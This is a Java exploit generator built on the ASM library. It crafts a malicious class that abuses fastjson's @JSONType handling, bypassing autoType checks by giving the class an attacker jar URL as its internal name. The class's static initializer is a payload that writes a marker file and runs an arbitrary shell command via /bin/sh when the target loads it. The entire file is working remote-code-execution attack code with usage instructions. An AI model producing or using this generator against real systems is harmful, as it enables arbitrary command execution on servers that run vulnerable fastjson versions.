import org.objectweb.asm.*;

/**
 * Crafts the malicious @JSONType class served by the attacker jar.
 *
 * Two things matter and both are attacker-controlled:
 *   1) the class carries the com.alibaba.fastjson @JSONType annotation, so fastjson's
 *      ASM probe in checkAutoType sets jsonType=true and proceeds to loadClass() even
 *      with autoType DISABLED;
 *   2) the class's INTERNAL NAME is set to the crafted jar-URL string
 *      (jar:http://attacker:PORT/probe!/POC) so that defineClass() succeeds when the
 *      classloader resolves the attacker-supplied @type.
 * The static initializer is the payload — it runs the moment the class is defined.
 *
 * The jar-URL-as-internal-name technique is from the public PoC by @wouijvziqy:
 *   https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC
 *
 * Usage: java -cp .:asm.jar Gen "<internal-name>" <out.class> "<shell-command>"
 */
public class Gen {
    public static void main(String[] args) throws Exception {
        String internalName = args[0];                 // e.g. jar:http://attacker:8000/probe!/POC
        String out = args[1];                           // output .class file
        String cmd = args.length > 2 ? args[2] : "id >> /tmp/PWNED 2>&1";

        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC | Opcodes.ACC_SUPER,
                internalName, null, "java/lang/Object", null);
        cw.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true).visitEnd();

        // default constructor
        MethodVisitor c = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        c.visitCode();
        c.visitVarInsn(Opcodes.ALOAD, 0);
        c.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        c.visitInsn(Opcodes.RETURN);
        c.visitMaxs(1, 1);
        c.visitEnd();

        // static initializer = payload (runs at class definition time)
        MethodVisitor m = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        m.visitCode();
        // System.out.println(banner)
        m.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
        m.visitLdcInsn("=== fastjson @JSONType RCE: attacker class <clinit> executing in TARGET ===");
        m.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
        // new File("/tmp/PWNED").createNewFile()  (marker even if exec is slow)
        m.visitTypeInsn(Opcodes.NEW, "java/io/File");
        m.visitInsn(Opcodes.DUP);
        m.visitLdcInsn("/tmp/PWNED");
        m.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false);
        m.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/File", "createNewFile", "()Z", false);
        m.visitInsn(Opcodes.POP);
        // Runtime.getRuntime().exec(new String[]{"/bin/sh","-c", cmd})
        m.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        m.visitInsn(Opcodes.ICONST_3);
        m.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
        m.visitInsn(Opcodes.DUP); m.visitInsn(Opcodes.ICONST_0); m.visitLdcInsn("/bin/sh"); m.visitInsn(Opcodes.AASTORE);
        m.visitInsn(Opcodes.DUP); m.visitInsn(Opcodes.ICONST_1); m.visitLdcInsn("-c");      m.visitInsn(Opcodes.AASTORE);
        m.visitInsn(Opcodes.DUP); m.visitInsn(Opcodes.ICONST_2); m.visitLdcInsn(cmd);         m.visitInsn(Opcodes.AASTORE);
        m.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec",
                "([Ljava/lang/String;)Ljava/lang/Process;", false);
        m.visitInsn(Opcodes.POP);
        m.visitInsn(Opcodes.RETURN);
        m.visitMaxs(0, 0);
        m.visitEnd();

        cw.visitEnd();
        java.nio.file.Files.write(java.nio.file.Paths.get(out), cw.toByteArray());
        System.out.println("[gen] wrote " + out + " internalName=" + internalName + " cmd=" + cmd);
    }
}
